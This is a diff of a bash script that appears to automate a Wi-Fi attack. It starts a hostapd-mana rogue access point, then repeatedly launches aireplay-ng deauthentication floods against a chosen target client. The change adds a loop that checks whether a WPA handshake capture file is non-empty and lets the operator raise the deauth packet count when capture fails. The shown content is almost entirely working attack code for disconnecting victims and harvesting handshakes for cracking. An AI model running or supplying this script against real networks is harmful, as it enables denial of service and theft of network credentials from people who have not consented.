@@ -429,19 +429,43 @@ TARGET_CLIENT_MAC="${client_list[$client_index]}"
 echo "Target client selected: $TARGET_CLIENT_MAC"
 
 echo "Starting hostapd-mana for Rogue AP deployment in a new terminal..."
-
 launch_terminal "echo 'Running hostapd-mana...'; sudo hostapd-mana \"$CONFIG_FILE\" -dd"
 
 sleep 3
 
 echo ""
 echo "Initiating deauthentication attack against target client in another terminal..."
-launch_terminal "echo 'Deauth Attack - Tekan CTRL+C untuk stop'; sudo aireplay-ng --deauth 1000 -a $TARGET_BSSID -c $TARGET_CLIENT_MAC $TARGET_MONITOR_IFACE"
+DEAUTH_COUNT=5
+ATTEMPT=1
 
-echo ""
-read -rp "Press [ENTER] in this main terminal after deauthentication is complete to continue..."
+while true; do
+    echo "Deauth Attempt #$ATTEMPT"
+    launch_terminal "echo 'Deauth Attack - Press CTRL+C to stop'; sudo aireplay-ng $TARGET_MONITOR_IFACE -0 $DEAUTH_COUNT -a $TARGET_BSSID -c $TARGET_CLIENT_MAC"
 
-read -rp "Press [ENTER] again to terminate hostapd-mana and proceed to handshake verification..."
+    read -rp "Press [ENTER] in this main terminal after deauthentication is complete to continue checking for handshake..."
+
+    echo "Checking for captured handshake..."
+    if ! file "${TARGET_ESSID}-handshake.hccapx" | grep -q "empty"; then
+        echo "Handshake successfully captured!"
+        break
+    else
+        echo "Handshake not captured yet."
+
+        if (( ATTEMPT >= 3 )); then
+            read -rp "Handshake still not captured after $ATTEMPT attempts. Do you want to increase deauth intensity? (y/n): " increase
+            if [[ "$increase" == "y" || "$increase" == "Y" ]]; then
+                read -rp "Enter new deauth packet count (current: $DEAUTH_COUNT): " new_count
+                DEAUTH_COUNT=${new_count:-$DEAUTH_COUNT}
+                echo "Deauth packet count set to: $DEAUTH_COUNT"
+            fi
+        fi
+
+        ((ATTEMPT++))
+    fi
+done
+
+read -rp "Press [ENTER] to terminate hostapd-mana and proceed to handshake verification..."
+
 
 echo "Stopping hostapd-mana..."
 sudo pkill -f "hostapd-mana \"$CONFIG_FILE\""
